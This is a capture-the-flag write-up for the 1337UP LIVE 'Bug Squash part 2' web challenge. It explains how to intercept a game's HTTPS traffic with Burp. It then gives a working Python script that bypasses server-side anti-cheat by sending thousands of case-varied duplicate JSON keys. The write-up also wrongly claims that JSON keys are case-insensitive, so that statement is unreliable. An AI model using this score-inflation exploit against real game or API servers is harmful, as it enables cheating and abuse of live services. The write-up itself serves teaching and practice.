---
title: "Bug Squash (part 2) - 1337UP LIVE CTF"
category: "web"
subcategory: "network"
type: "writeup"
tags: ["web", "wireshark", "il2cpp", "bug", "squash", "network", "1337up-live-ctf", "ctf-writeup"]
summary: "![VIDEO](<https://youtu.be/dEA68Aa0V-s> \"Bypassing Server-side Anti-Cheat Protections\")"
source:
  name: "CTFtime writeup #39668"
  url: "https://ctftime.org/writeup/39668"
original_source: "https://cryptocat.me/blog/ctf/2024/intigriti/game/bug_squash2/"
ctf:
  name: "1337UP LIVE CTF"
  challenge: "Bug Squash (part 2)"
---

## Metadata

- **CTF:** 1337UP LIVE CTF
- **Task:** Bug Squash (part 2)
- **Author team:** CryptoCat
- **CTFtime:** <https://ctftime.org/writeup/39668>
- **Original writeup:** <https://cryptocat.me/blog/ctf/2024/intigriti/game/bug_squash2/>

---
[![VIDEO](<https://img.youtube.com/vi/dEA68Aa0V-s/0.jpg>)](<https://youtu.be/dEA68Aa0V-s> "Bypassing Server-side Anti-Cheat Protections")

The description indicates we need more than 100,000 points to win, but there's a 2 minute time limit on each game..

![Image](<https://cryptocat.me/blog/ctf/2024/intigriti/game/bug_squash2/images/gameplay-score-timer.png>)

We'll struggle to decompile the game as we did in part 1 due to it being compiled with `IL2CPP` instead of `Mono`. You could still attach cheat engine and reverse the code as DavidP did in [this video](<https://youtu.be/Nk-TNzHxN0M>) (he actually reconstructed the C# code from assembly!)

My expected approach was to open Wireshark and see some network traffic when the game is running. Since the traffic is HTTPS, players have to do a little work to decrypt it.

\- Setup Windows proxy `127.0.0.1:8080`  
\- Setup burp cert to capture HTTPS traffic  
\- Export proxy cert in PKCS format  
\- `Windows > Manage user certificates > Trusted Root Certification Authorities > Certificates > All Tasks > Import`  
\- Traffic will now show in burp

The `/start_game` endpoint will initialise a game.

![Image](<https://cryptocat.me/blog/ctf/2024/intigriti/game/bug_squash2/images/start-game-request.png>)

Each time we score a point, a request is issued to the `/update_score` endpoint.

![Image](<https://cryptocat.me/blog/ctf/2024/intigriti/game/bug_squash2/images/update-score-request.png>)

We can try to modify the traffic to change the points but from trial and error we will find some conditions

\- Anti-cheat resets users score if they send more then 3 request per second  
\- Anti-cheat rejects any point values that aren't 1 (and resets score)  
\- Anti-cheat checks that players score didn't jump to an unrealistic number (more than 4096 per request)

![Image](<https://cryptocat.me/blog/ctf/2024/intigriti/game/bug_squash2/images/anti-cheat-reset.png>)

The game resets every 2 mins so by the anti-cheat rules, max attainable score is `(120 * 3)`)

Since they can't change the value, I thought players might play around with the keys.

```json  
`{"5e258b4a-23cf-469c-9264-b73856d9fe20": "insert_id", "bugs_squashed": 1, "bugs_squashed": 1}`  
```

This would fail because the keys are duplicate. The thing about JSON is the [keys are non case-sensitive](<https://www.quora.com/Is-JSON-case-sensitive>), so I hoped players would try to send `BUGS_SQUASHED` as well as`bugs_squashed` and see they score points.

So yes, intended solution is to send `{"user_id": "insert_id", "bugs_squashed": 1, "bUgs_squashed": 1, "buGs_squashed": 1}` etc, where you can send 4096 variations per request at a max speed of 3 requests per second. Here's a solve script to do that.

### [solve.py](http://solve.py)

```python  
import requests  
import itertools  
import time

BASE_URL = '<https://bugsquash.ctf.intigriti.io>'

def generate_variations(s):  
"""Generate all case variations of a string."""  
return [''.join(variant) for variant in itertools.product(*([letter.lower(), letter.upper()] for letter in s))]

def start_game(session):  
"""Start a new game session and return the user_id."""  
response = [session.post](http://session.post)(f'{BASE_URL}/start_game')  
response_data = response.json()  
user_id = response_data['user_id']  
score = response_data['score']  
print(f"Game started! User ID: {user_id}, Initial Score: {score}")  
return user_id, score

def update_score(session, user_id, variations):  
"""Send score updates to the server using all variations of 'bugs_squashed'."""  
json_data = {"user_id": user_id}  
json_data.update({variation: 1 for variation in variations})

response = [session.post](http://session.post)(  
f'{BASE_URL}/update_score', json=json_data)  
response_data = response.json()

if "error" in response_data:  
print(f"Error: {response_data['error']}")  
elif "message" in response_data:  
print(  
f"Message: {response_data['message']}, Current Score: {response_data['score']}")

return response_data.get('score', 0)

def play_game(variations, target_score=100000):  
"""Play the game until the target score is reached."""  
with requests.Session() as session:  
user_id, score = start_game(session)

print(len(variations))

while score < target_score:  
score = update_score(session, user_id, variations)  
time.sleep(0.333) # 3 requests per second

print(f"Target score reached! Final Score: {score}")

if __name__ == "__main__":  
variations = generate_variations("bugs_squashed")  
play_game(variations)  
```

Run the solve script.

```bash  
python [solve.py](http://solve.py)  
Game started! User ID: 700d9b33-1eef-42d0-bf37-afcc41a857cf, Initial Score: 0  
8192  
Message: Score updated by 4096 points., Current Score: 4096  
Message: Score updated by 4096 points., Current Score: 8192  
Message: Score updated by 4096 points., Current Score: 12288  
Message: Score updated by 4096 points., Current Score: 16384  
Message: Score updated by 4096 points., Current Score: 20480  
Message: Score updated by 4096 points., Current Score: 24576  
Message: Score updated by 4096 points., Current Score: 28672  
Message: Score updated by 4096 points., Current Score: 32768  
Message: Score updated by 4096 points., Current Score: 36864  
Message: Score updated by 4096 points., Current Score: 40960  
Message: Score updated by 4096 points., Current Score: 45056  
Message: Score updated by 4096 points., Current Score: 49152  
Message: Score updated by 4096 points., Current Score: 53248  
Message: Score updated by 4096 points., Current Score: 57344  
Message: Score updated by 4096 points., Current Score: 61440  
Message: Score updated by 4096 points., Current Score: 65536  
Message: Score updated by 4096 points., Current Score: 69632  
Message: Score updated by 4096 points., Current Score: 73728  
Message: Score updated by 4096 points., Current Score: 77824  
Message: Score updated by 4096 points., Current Score: 81920  
Message: Score updated by 4096 points., Current Score: 86016  
Message: Score updated by 4096 points., Current Score: 90112  
Message: Score updated by 4096 points., Current Score: 94208  
Message: Score updated by 4096 points., Current Score: 98304  
Message: INTIGRITI{64m3_h4ck1n6_4n71ch347_15_4l50_fun!}, Current Score: 102400  
Target score reached! Final Score: 102400  
```

Flag: `INTIGRITI{64m3_h4ck1n6_4n71ch347_15_4l50_fun!}`
